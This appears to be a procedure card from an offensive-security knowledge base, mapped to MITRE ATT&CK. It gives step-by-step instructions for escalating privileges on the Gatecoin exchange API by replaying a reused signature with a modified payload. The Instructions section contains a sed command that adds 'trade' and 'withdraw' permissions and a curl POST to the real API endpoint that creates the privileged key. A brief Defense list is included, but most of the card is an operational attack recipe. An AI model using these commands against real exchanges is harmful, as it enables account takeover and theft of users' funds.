---
id: proc-gatecoin-replay-escalation
name: Replay Modified API Request for Privilege Escalation
tags:
  - replay-attack
  - privilege-escalation
type: procedure
tools:
  - '[[tools/reuse_signature_gatecoin.py]]'
tactics:
  - '[[Persistence]]'
commands:
  - '[[commands/curl-replay-modified-key]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[External Remote Services]]'
updated_at: '2025-12-14T17:32:20.794Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[External Remote Services]]'
---
# Replay Modified API Request for Privilege Escalation

## Summary

This procedure resends the original API request using the reused signature but with a modified payload to change permissions from read-only to full trading and withdrawal access, exploiting the signature's exclusion of payload data.

## Description

After cache expiration, the signature validates against the original timestamp and parameters, ignoring payload changes. Modifying the permissions array allows creation of a privileged key, enabling unauthorized actions like trading low-liquidity assets or adding attacker wallets. This step assumes prior cache wait and uses the Python script for automation if manual curl is insufficient.

## Requirements

1. Expired-cache confirmed initial request with signature
2. Timestamp still within 5-minute server window
3. JSON editor or sed for payload modification
4. Valid API endpoint access

## Defense

Defensive measures and detection strategies:

- Hash payloads into signatures to detect modifications
- Audit API key creations for permission mismatches
- Implement rate limiting on key creation endpoints
- Use multi-factor for privilege changes and monitor for anomalous keys

## Objectives

1. Modify payload to include elevated permissions
2. Replay request successfully with reused signature
3. Obtain and verify new privileged API key

## Instructions

### Step 1: Modify the Payload

**Context**: Alter the permissions in the JSON to enable trading and withdrawals.

**Command** (using sed for modification):
```bash
sed -i 's/"permissions": \["read"]/"permissions": ["read", "trade", "withdraw"]/' initial_request.json
echo "Payload modified. Permissions now include trade and withdraw."
cat initial_request.json
```

> Expected output: Updated JSON with expanded permissions array.

### Step 2: Execute Replay Request

**Context**: Send the modified request using the original signature.

**Command** ([[commands/curl-replay-modified-key]]):
```bash
curl -X POST 'https://api.gatecoin.com/api/v1/keys' \
  -H 'Authorization: Bearer REUSED_SIGNATURE' \
  -H 'Content-Type: application/json' \
  -d '@initial_request.json' \
  --output escalated_key.json
cat escalated_key.json
```

> Expected output: HTTP 200 with new API key details, including full permissions. Success if no auth or duplicate errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]] Persistence

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[External Remote Services]] External Remote Services

### Sub-Techniques


## Commands Used

- [[commands/curl-replay-modified-key]]

## Tools Used

- [[tools/reuse_signature_gatecoin.py]]

## Tags

- [[replay-attack]]
- [[privilege-escalation]]
